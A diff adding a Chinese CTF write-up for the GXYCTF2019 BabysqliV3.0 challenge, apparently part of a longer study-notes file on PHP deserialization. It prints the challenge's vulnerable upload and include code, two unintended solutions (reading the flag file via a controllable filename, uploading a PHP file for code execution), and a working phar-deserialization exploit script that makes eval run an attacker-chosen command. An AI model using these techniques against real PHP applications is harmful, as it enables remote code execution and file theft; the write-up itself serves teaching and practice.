@@ -1760,6 +1760,199 @@ so:
 
     payload: `file=phar://upload/xxxx.jpg`,得到的内容base64解码
 
+#### GXYCTF2019 BabysqliV3.0
+
+1. 题目分析
+
+    进去提示sql注入，其实这道题和sql注入无关，一开始的登录是弱密码，这道题的考点是phar反序列化
+
+    **url末尾是file=的形式，怀疑是文件包含，并且自动在xxx后面加.php。**
+
+    所以可以用php伪协议读取源码
+
+    upload.php
+    ```php
+    <?php
+    error_reporting(0);
+    class Uploader{
+        public $Filename;
+        public $cmd;
+        public $token;
+        
+
+        function __construct(){
+            $sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
+            $ext = ".txt";
+            @mkdir($sandbox, 0777, true);
+            if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
+                $this->Filename = $_GET['name'];
+            }
+            else{
+                $this->Filename = $sandbox.$_SESSION['user'].$ext;
+            }
+
+            $this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
+            $this->token = $_SESSION['user'];
+        }
+
+        function upload($file){
+            global $sandbox;
+            global $ext;
+
+            if(preg_match("[^a-z0-9]", $this->Filename)){
+                $this->cmd = "die('illegal filename!');";
+            }
+            else{
+                if($file['size'] > 1024){
+                    $this->cmd = "die('you are too big (′▽`〃)');";
+                }
+                else{
+                    $this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
+                }
+            }
+        }
+
+        function __toString(){
+            global $sandbox;
+            global $ext;
+            // return $sandbox.$this->Filename.$ext;
+            return $this->Filename;
+        }
+
+        function __destruct(){
+            if($this->token != $_SESSION['user']){
+                $this->cmd = "die('check token falied!');";
+            }
+            eval($this->cmd);
+        }
+    }
+
+    if(isset($_FILES['file'])) {
+        $uploader = new Uploader();
+        $uploader->upload($_FILES["file"]);
+        if(@file_get_contents($uploader)){
+            echo "下面是你上传的文件：<br>".$uploader."<br>";
+            echo file_get_contents($uploader);
+        }
+    }
+    ?>
+    ```
+
+    home.php
+    ```php
+    <?php
+    session_start();
+    echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";
+    error_reporting(0);
+    if(isset($_SESSION['user'])){
+        if(isset($_GET['file'])){
+            if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
+                die("hacker!");
+            }
+            else{
+                if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){
+                    $file = $_GET['file'].".php";
+                }
+                else{
+                    $file = $_GET['file'].".fxxkyou!";
+                }
+                echo "当前引用的是 ".$file;
+                require $file;
+            }
+            
+        }
+        else{
+            die("no permission!");
+        }
+    }
+    ?>
+    ```
+
+    代码中给了一个class，怀疑可能是一道反序列化的题目，没有反序列化函数但是又涉及到文件上传，基本可以确定是一道phar反序列化题目。
+
+    反序列化题目一般可用的点主要是各个魔术方法，本题目中两个魔术方法有可能被利用。
+
+2. 解题-非预期解
+
+    1. 非预期解1
+
+        __toString魔术方法被调用了，该方法返回一个文件名，如果存在读取文件的操作，也可能被利用。刚好file_get_contents方法触发了该方法，因此可以通过将Filename参数改为flag的路径来读取flag信息。
+
+        ```php
+        if(isset($_FILES['file'])) {
+            $uploader = new Uploader();
+            $uploader->upload($_FILES["file"]);
+            if(@file_get_contents($uploader)){
+                echo "下面是你上传的文件：<br>".$uploader."<br>";
+                echo file_get_contents($uploader);
+            }
+        }
+        ```
+
+        恰好在Uploader类中存在一个可以直接控制Filename的方法：
+        ```php
+        if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
+            $this->Filename = $_GET['name'];
+        }
+        ```
+
+        用户可以自己传一个name参数作为Filename，并且过滤也并没有限制读取flag。
+
+        接下来的过程就比较简单了，访问/home.php?file=upload&name=/var/www/html/flag.php，然后随便上传一个符合要求的文件，即可得到flag。
+
+    2. 非预期解2
+
+        这个题，上传的时候并没有过滤PHP，还可以指定上传的文件名。所以，直接上传个PHP文件，即可执行命令。本文传了一个写有phpinfo的文件进行测试，上传的文件为a.php。
+
+        上传的时候url为home.php?file=upload&name=a.php。
+
+        上传后访问根目录下的a.php即可。 
+
+3. 预期解
+
+    预期解应该是对cmd参数的利用
+
+    cmd的利用在destruct魔术方法中，要想利用cmd必须绕过对token的比较。
+
+    ```php
+    if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
+			$this->Filename = $_GET['name'];
+    }
+    else{
+        $this->Filename = $sandbox.$_SESSION['user'].$ext;
+    }
+
+    $this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
+    $this->token = $_SESSION['user'];
+    ```
+    根据上述代码，token来自`$_SESSION['user']`,而如果用户不自己传递name的值，则Filename的值中会包含
+
+    `$_SESSION['user']`。因此我们可以先随便上传一个文件，不传递name参数，这样就可以拿到`$_SESSION['user']`。
+
+    exp:
+    ```php
+    <?php
+    error_reporting(0);
+    class Uploader{
+        public $Filename = 'aaa';
+        //可以先用phpinfo等函数测试一下
+        public $cmd = 'echo file_get_contents("/var/www/html/flag.php");';
+        public $token = 'GXY88cc1f1606f74121a99dd1de5560b585';
+
+    }
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar");
+    $phar->startBuffering();
+    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
+    $o = new Uploader();
+    $phar->setMetadata($o); //将自定义的meta-data存入manifest
+    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
+    //签名自动计算
+    $phar->stopBuffering();
+    ?>
+    ```
+    将生成的phar文件上传，利用phar协议访问url即可。
+
 ### 类型五-原生类利用
 
 #### 极客大挑战 2020 Greatphp
